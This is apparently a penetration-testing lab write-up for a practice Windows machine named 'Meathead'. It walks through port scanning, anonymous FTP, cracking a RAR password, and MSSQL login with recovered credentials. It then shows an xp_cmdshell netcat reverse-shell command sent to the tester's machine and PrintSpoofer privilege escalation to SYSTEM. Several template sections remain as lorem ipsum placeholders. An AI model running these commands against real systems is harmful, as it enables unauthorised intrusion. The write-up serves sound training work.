---
Alias: Meathead
Date: 7/1/22
Platform: Windows
Difficulty: Hard
Tags:
Status: Finished
IP: 192.168.114.70
---

# {{Meathead}}


# Resolution summary
- Found we are able to login anonymously to FTP server
- Found MSS
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap
- gobuster

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.114.70 --ulimit 5000                                                                                       (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.114.70:80
Open 192.168.114.70:135
Open 192.168.114.70:139
Open 192.168.114.70:445
Open 192.168.114.70:1221
Open 192.168.114.70:1435
Open 192.168.114.70:3389
Open 192.168.114.70:5985
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 23:49 EDT
Initiating Ping Scan at 23:49
Scanning 192.168.114.70 [2 ports]
Completed Ping Scan at 23:49, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:49
Completed Parallel DNS resolution of 1 host. at 23:49, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:49
Scanning 192.168.114.70 [8 ports]
Discovered open port 3389/tcp on 192.168.114.70
Discovered open port 135/tcp on 192.168.114.70
Discovered open port 139/tcp on 192.168.114.70
Discovered open port 80/tcp on 192.168.114.70
Discovered open port 445/tcp on 192.168.114.70
Discovered open port 5985/tcp on 192.168.114.70
Discovered open port 1221/tcp on 192.168.114.70
Discovered open port 1435/tcp on 192.168.114.70
Completed Connect Scan at 23:49, 0.08s elapsed (8 total ports)
Nmap scan report for 192.168.114.70
Host is up, received syn-ack (0.080s latency).
Scanned at 2022-06-30 23:49:26 EDT for 0s

PORT     STATE SERVICE        REASON
80/tcp   open  http           syn-ack
135/tcp  open  msrpc          syn-ack
139/tcp  open  netbios-ssn    syn-ack
445/tcp  open  microsoft-ds   syn-ack
1221/tcp open  sweetware-apps syn-ack
1435/tcp open  ibm-cics       syn-ack
3389/tcp open  ms-wbt-server  syn-ack
5985/tcp open  wsman          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

sudo nmap -sC -sV 192.168.114.70 -p 80,135,139,445,1221,1435,3389,5985                                      (master✱) 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 00:02 EDT
Nmap scan report for 192.168.114.70
Host is up (0.10s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Plantronics
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1221/tcp open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-27-20  07:02PM                18866 Elementum Supremum.docx
| 04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
| 04-27-20  07:02PM                15690 img.jpg
| 04-27-20  07:02PM                  302 MSSQL_BAK.rar
| 04-27-20  07:02PM                  548 palindromes.txt
|_04-27-20  07:02PM                45369 server.jpg
1435/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-09-21T18:21:07
|_Not valid after:  2051-09-21T18:21:07
| ms-sql-ntlm-info: 
|   Target_Name: MEATHEAD
|   NetBIOS_Domain_Name: MEATHEAD
|   NetBIOS_Computer_Name: MEATHEAD
|   DNS_Domain_Name: Meathead
|   DNS_Computer_Name: Meathead
|_  Product_Version: 10.0.17763
|_ssl-date: 2022-07-01T04:03:54+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-07-01T04:03:54+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Meathead
| Not valid before: 2022-06-29T23:40:16
|_Not valid after:  2022-12-29T23:40:16
| rdp-ntlm-info: 
|   Target_Name: MEATHEAD
|   NetBIOS_Domain_Name: MEATHEAD
|   NetBIOS_Computer_Name: MEATHEAD
|   DNS_Domain_Name: Meathead
|   DNS_Computer_Name: Meathead
|   Product_Version: 10.0.17763
|_  System_Time: 2022-07-01T04:03:15+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-07-01T04:03:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.99 seconds

```

Enumerated open TCP ports:
```bash

```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80 - Microsoft IIS httpd 10.0

#### - Navigated to target IP address and found the following Plantronics login webpage:

![](Pasted%20image%2020221020002407.png)


#### - Typed "searchsploit Plantronics" and found the following privilege escalation exploit:

![](Pasted%20image%2020221020002530.png)

## PORT 1221 - Microsoft ftpd
#### - Per the nmap scan it shows we are able login anonymously via ftp

#### - Typed "ftp 192.168.114.70 -p 1221" used anonymous as user and anonymous as password and found the following files:

![](Pasted%20image%2020221020003245.png)

#### - Typed "mget MSSQL_BAK.rar" to download the file to my kali machine

#### - Attempted to open the "MSSQL_BACK.rar" file but it needed a password

#### - Typed "rar2john MSSQL_BAK.rar > back.hash" to retreive the rar file password hashand input it into the back.hash file

#### - Typed "john back.hash --wordlist=/usr/share/wordlists/rockyou.txt" and found password "letmeinplease"
![](Pasted%20image%2020221020003414.png)

#### - Typed "unrar e MSSQL_BAK.rar -p " and entered password "letmeinplease"

![](Pasted%20image%2020221020003518.png)

#### - And found username "sa" and password "EjectFrailtyThorn425"
![](Pasted%20image%2020221020003738.png)
---

# Exploitation
## Name of the technique
## Microsoft SQL Server Reverse Shell Exploit

#### - Logged into ms-sql by typing "mssqlclient.py -p 1435 sa:EjectFrailtyThorn425@192.168.114.70"

![](Pasted%20image%2020221020004521.png)
#MicrosoftSQLServerReverseShellExploit

#### - Typed "help" and found the following commands I can input:
![](Pasted%20image%2020221020004819.png)


#### - Typed "enable_xp_cmdshell" 

![](Pasted%20image%2020221020010406.png)

#### - Typed "enable_xp_cmdshell system info" and found the system architecture to be x64 bit

#### - Typed "xp_cmdshell" and found we were in directory "C:\Windows\system32"

![](Pasted%20image%2020221020010503.png)

#### - I attempted to get a reverse shell using "curl.exe" and "certultil.exe" as I was able to find both within system32 directory but had no luck

#### - I then started an smb share hosting "nc64.exe" file on my kali machine by typing "smbserver.py Share /home/kali/Downloads":

![](Pasted%20image%2020221020010606.png)
#SMBServer.pyShare

#### - I then started a netcat listener on my kali machine listening on port 3389

#### - I then typed "xp_cmdshell \\[Kali IP]\Share\nc64.exe -e cmd.exe 192.168.49.114 3389" on the mssql target machine and received a reverse shell on the listener:

![](Pasted%20image%2020221020010759.png)
---

# Lateral Movement to user
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Lateral Movement vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Privilege Escalation
## Local Enumeration

#### - Typed "whoami /priv" and found SeImpersonatePrivilege was enabled:

![](Pasted%20image%2020221020011101.png)
#SeImpersonatePrivilege 

#### -Navigated to directory "C:\Users\Public"

#### - Typed "copy \\[Kali IP]\Share\PrintSpoofer64.exe" to copy the PrintSpoofer64.exe compiled privesc exploit on the target machine

#PrintSpoofer64.exePrivescExploit

#### - Typed "PrintSpoofer64.exe -i -c cmd" and received a shell running with system privileges:

![](Pasted%20image%2020221020011216.png)


## Privilege Escalation vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

